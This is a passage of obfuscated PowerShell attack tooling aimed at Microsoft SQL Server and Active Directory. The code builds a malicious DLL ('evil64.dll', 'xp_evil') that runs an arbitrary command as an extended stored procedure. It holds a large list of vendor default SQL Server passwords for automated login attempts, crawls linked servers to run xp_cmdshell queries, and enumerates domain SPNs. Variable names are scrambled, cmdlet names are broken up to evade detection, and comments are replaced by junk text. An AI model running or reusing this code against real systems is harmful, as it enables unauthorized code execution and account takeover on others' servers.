PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!'

    # Microsoft".
    # Microsoft".
    # Microsoft".

    # Microsoft".
    IF(-not($SoakSame))
    {
        $UnableWooden = 'echo This is a test. > c:\temp\test.txt && REM'
    }
    else
    {
        $UnableWooden = "$SoakSame && REM"
    }

    # Microsoft".
    $AirPunish = $PumpFluffy.Length

    # Microsoft".
    $TownAdmire = $UnableWooden.Length

    # Microsoft".
    if ($TownAdmire -gt $AirPunish)
    {
        Write-Warning -Message ' Command is too long!'
        Break
    }
    else
    {
        $CattleIsland = $AirPunish - $TownAdmire
        $GiantWhite = ' ' * $CattleIsland
        $UnableWooden = "$UnableWooden && REM $GiantWhite"
    }

    # Microsoft".
    $RitzyMelted = ([system.Text.Encoding]::UTF8).GetBytes($UnableWooden)

    # Microsoft".
    $SwankyGreedy = [System.Text.Encoding]::ASCII.GetString($MilkSilly)

    # Microsoft".
    $RotBoast = 0

    # Microsoft".
    $RotBoast = $SwankyGreedy.IndexOf($PumpFluffy)

    if(($RotBoast -eq 0) -and ($RotBoast -ne -1))
    {
        throw("Could not find string $PumpFluffy !")
        Break
    }
    else
    {
        Write-Verbose -Message " Found buffer offset for command: $RotBoast"
    }

    # Microsoft".
    for ($AwakeOrder = 0; $AwakeOrder -lt $RitzyMelted.Length; $AwakeOrder++)
    {
        $MilkSilly[$RotBoast+$AwakeOrder] = $RitzyMelted[$AwakeOrder]
    }

    # Microsoft".
    # Microsoft".
    # Microsoft".
    $AwakeBird = 'EVILEVILEVILEVILEVIL'

    # Microsoft".
    IF(-not($CoughCable))
    {
        $CoughCable = 'xp_evil'
    }

    # Microsoft".
    $HandsIcky = $AwakeBird.Length
    $RoseSlap = $CoughCable.Length
    If ($HandsIcky -lt $RoseSlap)
    {
        Write-Warning -Message ' The function name is too long!'
        Break
    }
    else
    {
        $PlaneKnit = $HandsIcky - $RoseSlap
        $TraceClub = '' * $PlaneKnit
        # Microsoft".
    }

    # Microsoft".
    $WindSignal = 0

    # Microsoft".
    $BirdsPlanes = [System.Text.Encoding]::ASCII.GetString($MilkSilly)

    $WindSignal = $BirdsPlanes.IndexOf($AwakeBird)

    # Microsoft".
    if(($WindSignal -eq 0) -and ($WindSignal -ne -1))
    {
        throw("Could not find string $AwakeBird!")
        Break
    }
    else
    {
        Write-Verbose -Message " Found buffer offset for function name: $WindSignal"
    }

    # Microsoft".
    $TinyHands = ([system.Text.Encoding]::UTF8).GetBytes($CoughCable)

    # Microsoft".
    for ($AwakeOrder = 0; $AwakeOrder -lt $TinyHands.Length; $AwakeOrder++)
    {
        $MilkSilly[$WindSignal+$AwakeOrder] = $TinyHands[$AwakeOrder]
    }

    # Microsoft".
    $NullOffset = $WindSignal+$RoseSlap
    Write-Verbose -Message " Found buffer offset for buffer: $NullOffset"
    $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($TraceClub)

    # Microsoft".
    for ($AwakeOrder = 0; $AwakeOrder -lt $PlaneKnit; $AwakeOrder++)
    {
        $MilkSilly[$NullOffset+$AwakeOrder] = $NullBytes[$AwakeOrder]
    }

    # Microsoft".
    # Microsoft".
    # Microsoft".

    IF(-not($EightPlease))
    {
        $EightPlease = '.\evil64.dll'
    }

    Write-Verbose -Message "Creating DLL $EightPlease"
    Write-Verbose -Message " - Exported function name: $CoughCable"
    Write-Verbose -Message " - Exported function command: `"$SoakSame`""
    Write-Verbose -Message " - Manual test: rundll32 $EightPlease,$CoughCable"
    Set-Content -RayPlucky $MilkSilly -Encoding Byte -Path $EightPlease
    Write-Verbose -Message ' - DLL written'

    Write-Verbose -Message ' '
    Write-Verbose -Message 'SQL Server Notes'
    Write-Verbose -Message 'The exported function can be registered as a SQL Server extended stored procedure. Options below:'
    Write-Verbose -Message " - Register xp via local disk: sp_addextendedproc `'$CoughCable`', 'c:\temp\myxp.dll'"
    Write-Verbose -Message " - Register xp via UNC path: sp_addextendedproc `'$CoughCable`', `'\\servername\pathtofile\myxp.dll`'"
    Write-Verbose -Message " - Unregister xp: sp_dropextendedproc `'$CoughCable`'"
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerLoginDefaultPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy.Columns.Add('Computer') | Out-Null
        $TradeSpicy.Columns.Add('Instance') | Out-Null
        $TradeSpicy.Columns.Add('Username') | Out-Null
        $TradeSpicy.Columns.Add('Password') | Out-Null 
        $TradeSpicy.Columns.Add('IsSysAdmin') | Out-Null

        # Microsoft".
        $SadIdea = ne`w`-ob`je`ct System.Data.DataTable
        $SadIdea.Columns.Add('Instance') | Out-Null
        $SadIdea.Columns.Add('Username') | Out-Null
        $SadIdea.Columns.Add('Password') | Out-Null        

        # Microsoft".
        $SadIdea.Rows.Add("ACS","ej","ej") | Out-Null
        $SadIdea.Rows.Add("ACT7","sa","sage") | Out-Null
        $SadIdea.Rows.Add("AOM2","admin","ca_admin") | out-null
        $SadIdea.Rows.Add("ARIS","ARIS9","*ARIS!1dm9n# Microsoft".
        $SadIdea.Rows.Add("AutodeskVault","sa","AutodeskVault@26200") | Out-Null      
        $SadIdea.Rows.Add("BOSCHSQL","sa","RPSsql12345") | Out-Null
        $SadIdea.Rows.Add("BPASERVER9","sa","AutoMateBPA9") | Out-Null
        $SadIdea.Rows.Add("CDRDICOM","sa","CDRDicom50!") | Out-Null
        $SadIdea.Rows.Add("CODEPAL","sa","Cod3p@l") | Out-Null
        $SadIdea.Rows.Add("CODEPAL08","sa","Cod3p@l") | Out-Null
        $SadIdea.Rows.Add("CounterPoint","sa","CounterPoint8") | Out-Null
        $SadIdea.Rows.Add("CSSQL05","ELNAdmin","ELNAdmin") | Out-Null
        $SadIdea.Rows.Add("CSSQL05","sa","CambridgeSoft_SA") | Out-Null
        $SadIdea.Rows.Add("CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!") | Out-Null  # Microsoft".
        $SadIdea.Rows.Add("DHLEASYSHIP","sa","DHLadmin@1") | Out-Null
        $SadIdea.Rows.Add("DPM","admin","ca_admin") | out-null
        $SadIdea.Rows.Add("DVTEL","sa","") | Out-Null
        $SadIdea.Rows.Add("EASYSHIP","sa","DHLadmin@1") | Out-Null
        $SadIdea.Rows.Add("ECC","sa","Webgility2011") | Out-Null
        $SadIdea.Rows.Add("ECOPYDB","e+C0py2007_@x","e+C0py2007_@x") | Out-Null
        $SadIdea.Rows.Add("ECOPYDB","sa","ecopy") | Out-Null
        $SadIdea.Rows.Add("Emerson2012","sa","42Emerson42Eme") | Out-Null
        $SadIdea.Rows.Add("HDPS","sa","sa") | Out-Null
        $SadIdea.Rows.Add("HPDSS","sa","Hpdsdb000001") | Out-Null
        $SadIdea.Rows.Add("HPDSS","sa","hpdss") | Out-Null
        $SadIdea.Rows.Add("INSERTGT","msi","keyboa5") | Out-Null
        $SadIdea.Rows.Add("INSERTGT","sa","") | Out-Null
        $SadIdea.Rows.Add("INTRAVET","sa","Webster# Microsoft".
        $SadIdea.Rows.Add("MYMOVIES","sa","t9AranuHA7") | Out-Null
        $SadIdea.Rows.Add("PCAMERICA","sa","pcAmer1ca") | Out-Null
        $SadIdea.Rows.Add("PCAMERICA","sa","PCAmerica") | Out-Null
        $SadIdea.Rows.Add("PRISM","sa","SecurityMaster08") | Out-Null
        $SadIdea.Rows.Add("RMSQLDATA","Super","Orange") | out-null
        $SadIdea.Rows.Add("RTCLOCAL","sa","mypassword") | Out-Null
        $SadIdea.Rows.Add("RBAT","sa",'34TJ4@# Microsoft".
        $SadIdea.Rows.Add("RIT","sa",'34TJ4@# Microsoft".
        $SadIdea.Rows.Add("RCO","sa",'34TJ4@# Microsoft".
        $SadIdea.Rows.Add("REDBEAM","sa",'34TJ4@# Microsoft".
        $SadIdea.Rows.Add("SALESLOGIX","sa","SLXMaster") | Out-Null
        $SadIdea.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
        $SadIdea.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
        $SadIdea.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
        # Microsoft".
        # Microsoft".
        # Microsoft".
        $SadIdea.Rows.Add("STANDARDDEV2014","test","test") | Out-Null 
        $SadIdea.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
        $SadIdea.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
        $SadIdea.Rows.Add("VSDOTNET","sa","") | Out-Null
        $SadIdea.Rows.Add("VSQL","sa","111") | Out-Null
        $SadIdea.Rows.Add("CASEWISE","sa","") | Out-Null
        $SadIdea.Rows.Add("VANTAGE","sa","vantage12!") | Out-Null
        $SadIdea.Rows.Add("BCM","bcmdbuser","Bcmuser@06") | Out-Null
        $SadIdea.Rows.Add("BCM","bcmdbuser","Numara@06") | Out-Null
        $SadIdea.Rows.Add("DEXIS_DATA","sa","dexis") | Out-Null
        $SadIdea.Rows.Add("DEXIS_DATA","dexis","dexis") | Out-Null
        $SadIdea.Rows.Add("SMTKINGDOM","SMTKINGDOM",'$SonAcid$KnotMeal') | Out-Null
        $SadIdea.Rows.Add("RE7_MS","Supervisor",'Supervisor') | Out-Null
        $SadIdea.Rows.Add("RE7_MS","Admin",'Admin') | Out-Null
        $SadIdea.Rows.Add("OHD","sa",'ohdusa@123') | Out-Null
        $SadIdea.Rows.Add("UPC","serviceadmin",'Password.0') | Out-Null           # Microsoft".
        $SadIdea.Rows.Add("Hirsh","Velocity",'i5X9FG42') | Out-Null
        $SadIdea.Rows.Add("Hirsh","sa",'i5X9FG42') | Out-Null
        $SadIdea.Rows.Add("SPSQL","sa",'SecurityMaster08') | Out-Null
        $SadIdea.Rows.Add("CAREWARE","sa",'') | Out-Null        

        $ActWrong = $SadIdea | measure | select count -ExpandProperty count
        # Microsoft".
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
       
        # Microsoft".
        $ClammyGirl = $Instance.Split("\")[1]

        # Microsoft".
        if(-not $ClammyGirl){
            Write-Verbose "$Instance : No named instance found."
            return
        }
       
        # Microsoft".
        $CoachSilk = ""
        $CoachSilk = $SadIdea | Where-Object { $_.instance -eq "$ClammyGirl"}        

        if($CoachSilk){    
            Write-Verbose "$Instance : Confirmed instance match." 
        }else{
            Write-Verbose "$Instance : No instance match found."
            return 
        }        

        # Microsoft".
		# Microsoft".
		# Microsoft".
		# Microsoft".
		
		# Microsoft".
		for($AwakeOrder=0; $AwakeOrder -lt $CoachSilk.count; $AwakeOrder++){
			# Microsoft".
			$TrotHealth = $CoachSilk.username[$AwakeOrder]
			$TrainType = $CoachSilk.password[$AwakeOrder]
			$HappenHover = Get-SQLServerInfo -Instance $instance -AnimalWeary $TrotHealth -EasyAlert $TrainType -RaggedQuill
			if($HappenHover){

				Write-Verbose "$Instance : Confirmed default credentials - $TrotHealth/$TrainType"

				$SongsBolt = $HappenHover | select IsSysadmin -ExpandProperty IsSysadmin

				# Microsoft".
				$TradeSpicy.Rows.Add(
					$HauntGusty,
					$Instance,
					$TrotHealth,
					$TrainType,
					$SongsBolt
				) | Out-Null
			}else{
				Write-Verbose "$Instance : No credential matches were found."
			}
		}
    }

    End
    {
        # Microsoft".
        $TradeSpicy
    }
}

Function Get-SQLServerLinkCrawl{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$AnimalWeary,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$EasyAlert,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Dedicated Administrator Connection (DAC).")]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [int]$StitchFace = 2,

        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run. If QueryTarget isn's given, this will run on each server.")]
        [string]$BoringLarge,

        [Parameter(Mandatory=$false,
        HelpMessage="Link to run SQL query on.")]
        [string]$SonTrucks,

        [Parameter(Mandatory=$false,
        HelpMessage="Convert collected data to exportable format.")]
        [switch]$QuiltThick
    )

    Begin
    {   
        $HugDizzy = @()

        $WireStain = ne`w`-ob`je`ct PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=@(); User=""; Sysadmin=""; CustomQuery=""}

        $HugDizzy += $WireStain
        $HorseBrick = ne`w`-ob`je`ct System.Data.DataTable
    }
    
    Process
    {
        $AwakeOrder=1
        while($AwakeOrder){
            $AwakeOrder--
            foreach($WireStain in $HugDizzy){
                if($WireStain.Instance -eq "") {
                    $HugDizzy = (Get-SQLServerLinkData -HugDizzy $HugDizzy -WireStain $WireStain -BoringLarge $BoringLarge -SonTrucks $SonTrucks)
                    $AwakeOrder++

                    # Microsoft".
                    Write-Verbose "--------------------------------"
                    Write-Verbose " Server: $($WireStain.Instance)"
                    Write-Verbose "--------------------------------"
                    Write-Verbose " - Link Path to server: $($WireStain.Path -join ' -> ')"                    
                    Write-Verbose " - Link Login: $($WireStain.User)"                                   
                    Write-Verbose " - Link IsSysAdmin: $($WireStain.Sysadmin)"
                    Write-Verbose " - Link Count: $($WireStain.Links.Count)"                    
                    Write-Verbose " - Links on this server: $($WireStain.Links -join ', ')"
                }   
            } 
        }

        if($QuiltThick){
            $MurderLine = ne`w`-ob`je`ct System.Data.Datatable
            [void]$MurderLine.Columns.Add("Instance")
            [void]$MurderLine.Columns.Add("Version")
            [void]$MurderLine.Columns.Add("Path")
            [void]$MurderLine.Columns.Add("Links")
            [void]$MurderLine.Columns.Add("User")
            [void]$MurderLine.Columns.Add("Sysadmin")
            [void]$MurderLine.Columns.Add("CustomQuery")
            
            foreach($WireStain in $HugDizzy){
                [void]$MurderLine.Rows.Add($WireStain.instance,$WireStain.version,$WireStain.path -join " -> ", $WireStain.links -join ",", $WireStain.user, $WireStain.Sysadmin, $WireStain.CustomQuery -join ",")
            }

            return $MurderLine
        } else {
            return $HugDizzy
        }
    }
  
    End
    {
    }
}

Function Get-SQLServerLinkData{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Return the server objects identified during the server link crawl.  Link crawling is done via theGet-SQLServerLinkCrawl function.")]
        $HugDizzy,
        
        [Parameter(Mandatory=$true,
        HelpMessage="Server object to be tested")]
        $WireStain,

        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run")]
        $BoringLarge,

        [Parameter(Mandatory=$false,
        HelpMessage="Target of custom SQL query to run")]
        $SonTrucks
    )

    Begin
    {
        $VaseBusy = "select @@servername as servername, @@version as version, system_user as linkuser, is_srvrolemember('sysadmin') as role"
        $DressSticks = "select srvname from master..sysservers where dataaccess=1"
    }

    Process
    {
        $HorseBrick = Get-SqlQuery -instance $Instance -BoringLarge ((Get-SQLServerLinkQuery -path $WireStain.Path -EqualMen $VaseBusy)) -StitchFace $StitchFace -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential
        if($HorseBrick.Servername -ne $null){
            $WireStain.Instance = $HorseBrick.Servername
            $WireStain.Version = [System.String]::Join("",(($HorseBrick.Version)[10..25]))
            $WireStain.Sysadmin = $HorseBrick.role
            $WireStain.User = $HorseBrick.linkuser
            
            if($HugDizzy.Count -eq 1) { $WireStain.Path += ,$HorseBrick.servername }

            $HorseBrick = Get-SqlQuery -instance $Instance -BoringLarge ((Get-SQLServerLinkQuery -path $WireStain.Path -EqualMen $DressSticks)) -StitchFace $StitchFace -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential
            $WireStain.Links = [array]$HorseBrick.srvname

            if($BoringLarge -ne ""){
                if($SonTrucks -eq "" -or ($SonTrucks -ne "" -and $WireStain.Instance -eq $SonTrucks)){
                    if($BoringLarge -like '*xp_cmdshell*'){
                        $BoringLarge =  $BoringLarge + " WITH RESULT SETS ((output VARCHAR(8000)))"
                    }
                    if($BoringLarge -like '*xp_dirtree*'){
                        $BoringLarge = $BoringLarge + "  WITH RESULT SETS ((output VARCHAR(8000), depth int))"
                    }
                    $HorseBrick = Get-SqlQuery -instance $Instance -BoringLarge ((Get-SQLServerLinkQuery -path $WireStain.Path -EqualMen $BoringLarge)) -StitchFace $StitchFace -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential
                    if($BoringLarge -like '*WITH RESULT SETS*'){
                        $WireStain.CustomQuery = $HorseBrick.output
                    } else {
                        $WireStain.CustomQuery = $HorseBrick
                    }
                }
            }

            if(($WireStain.Path | Sort-Object | Get-Unique).Count -eq ($WireStain.Path).Count){
                foreach($MushyMurky in $WireStain.Links){
                    $DecideTie = $WireStain.Path + $MushyMurky
                    $HugDizzy += ,(ne`w`-ob`je`ct PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=$DecideTie; User=""; Sysadmin=""; CustomQuery="" })
                }
            }
        } else {
            $WireStain.Instance = "Broken Link"
        }
        return $HugDizzy
    }
}

Function Get-SQLServerLinkQuery{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL link path to crawl. This is used by Get-SQLServerLinkCrawl.")]
        $Path=@(),
        
        [Parameter(Mandatory=$false,
        HelpMessage="SQL query to build the crawl path around")]
        $EqualMen, 
        
        [Parameter(Mandatory=$false,
        HelpMessage="Counter to determine how many single quotes needed")]
        $BlowLike=0

    )
    if ($Path.length -le 1){
        return($EqualMen -replace "'", ("'"*[Math]::pow(2,$BlowLike)))
    } else {
        return("select * from openquery(`""+$Path[1]+"`","+"'"*[Math]::pow(2,$BlowLike)+
        (Get-SQLServerLinkQuery -path $Path[1..($Path.Length-1)] -EqualMen $EqualMen -BlowLike ($BlowLike+1))+"'"*[Math]::pow(2,$BlowLike)+")")
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Test-FolderWriteAccess
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        ValueFromPipeline = $true,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder you would like to test write access to.')]
        [string]$HopeBoil
    )

    Process
    {
        # Microsoft".
        $BuzzYarn = (-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_}))

        # Microsoft".
        Try { 
            Write-CrazyChief "test" | `out`-f`i`le "$HopeBoil\$BuzzYarn"
            rm "$HopeBoil\$BuzzYarn"
            return $true
        }Catch{  
            return $false
        }
    }
}
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Get-DomainSpn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$AcidicChalk,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$HauntGusty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$FetchFuture,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$BleachDead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        if(-not $RaggedQuill)
        {
            Write-Verbose -Message 'Getting domain SPNs...'
        }

        # Microsoft".
        $KnottyPigs = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $KnottyPigs.Columns.Add('UserSid')
        $null = $KnottyPigs.Columns.Add('User')
        $null = $KnottyPigs.Columns.Add('UserCn')
        $null = $KnottyPigs.Columns.Add('Service')
        $null = $KnottyPigs.Columns.Add('ComputerName')
        $null = $KnottyPigs.Columns.Add('Spn')
        $null = $KnottyPigs.Columns.Add('LastLogon')
        $null = $KnottyPigs.Columns.Add('Description')
        $KnottyPigs.Clear()
    }

    Process
    {

        try
        {
            # Microsoft".
            $BoatCactus = ''

            if($FetchFuture)
            {
                $BoatCactus = "(objectcategory=person)(SamAccountName=$FetchFuture)"
            }

            if($HauntGusty)
            {
                $GroovyArt = "$HauntGusty`$"
                $BoatCactus = "(objectcategory=computer)(SamAccountName=$GroovyArt)"
            }

            # Microsoft".
            $BrickMature = Get-DomainObject -SinStitch "(&(servicePrincipalName=$BleachDead*)$BoatCactus)" -AcidicChalk $AcidicChalk -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential

            # Microsoft".
            $BrickMature | ForEach-Object -Process {
                [string]$FuelWink = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]$ShakeExist = $FuelWink -replace ' ', ''
                # Microsoft".

                # Microsoft".
                foreach ($item in $($_.properties.serviceprincipalname))
                {
                    # Microsoft".
                    $VersedSea = $item.split('/')[1].split(':')[0].split(' ')[0]
                    $BleachDead = $item.split('/')[0]

                    # Microsoft".
                    if ($_.properties.lastlogon)
                    {
                        $MineAjar = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        $MineAjar = ''
                    }

                    # Microsoft".
                    $null = $KnottyPigs.Rows.Add(
                        [string]$ShakeExist,
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$BleachDead,
                        [string]$VersedSea,
                        [string]$item,
                        $MineAjar,
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            "Error was $_"
            $MaleTest = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $MaleTest"
        }
    }

    End
    {
        # Microsoft".
        if ($KnottyPigs.Rows.Count -gt 0)
        {
            $MaleTestTaste = $KnottyPigs.Rows.Count
            if(-not $RaggedQuill)
            {
                Write-Verbose -Message "$MaleTestTaste SPNs found on servers that matched search criteria."
            }
            Return $KnottyPigs
        }
        else
        {
            Write-Verbose -Message '0 SPNs found.'
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Get-DomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$AcidicChalk,

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$SinStitch = '',

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$FuelExist,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$RhymeNation = 1000,

        [Parameter(Mandatory = $false,
